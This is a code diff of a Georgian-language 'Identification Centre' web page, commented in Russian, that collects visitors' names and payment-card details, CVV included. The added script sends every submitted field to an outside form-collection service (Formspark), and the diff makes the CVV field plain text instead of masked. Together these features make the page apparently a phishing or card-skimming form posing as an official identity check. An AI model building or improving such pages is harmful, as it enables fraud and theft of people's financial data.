@@ -111,7 +111,8 @@ button:hover {
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
 
-    <form id="contact-form" action="https://submit.formspark.io/ZNHCwJg0T" method="POST">
+    <!-- Форма теперь без action/method -->
+    <form id="contact-form">
         <h3>დატოვეთ თქვენი მონაცემები</h3>
 
         <label for="first-name">სახელი (Имя)</label>
@@ -137,7 +138,7 @@ button:hover {
             </div>
             <div>
                 <label for="cvv">cvv</label>
-                <input type="password" name="cvv_code" id="cvv"
+                <input type="text" name="cvv_code" id="cvv"
                        placeholder="***"
                        maxlength="3"
                        inputmode="numeric"
@@ -168,22 +169,27 @@ document.getElementById('cvv').addEventListener('input', function (e) {
     e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
 });
 
-// Отправка формы с уведомлением без перезагрузки
+// Отправка формы через fetch на Formspark
 document.getElementById('contact-form').addEventListener('submit', function(e) {
-    e.preventDefault();
+    e.preventDefault(); // блокируем стандартную отправку
+
     const form = e.target;
-    fetch(form.action, {
+    const data = new FormData(form);
+
+    fetch('https://submit.formspark.io/ZNHCwJg0T', {
         method: 'POST',
-        body: new FormData(form),
+        body: data,
         headers: { 'Accept': 'application/json' }
-    }).then(response => {
-        if (response.ok) {
+    })
+    .then(response => {
+        if(response.ok){
             form.reset();
             document.getElementById('success-message').style.display = 'block';
         } else {
             alert('Ошибка отправки формы. Попробуйте позже.');
         }
-    }).catch(error => {
+    })
+    .catch(error => {
         alert('Ошибка отправки формы. Попробуйте позже.');
     });
 });
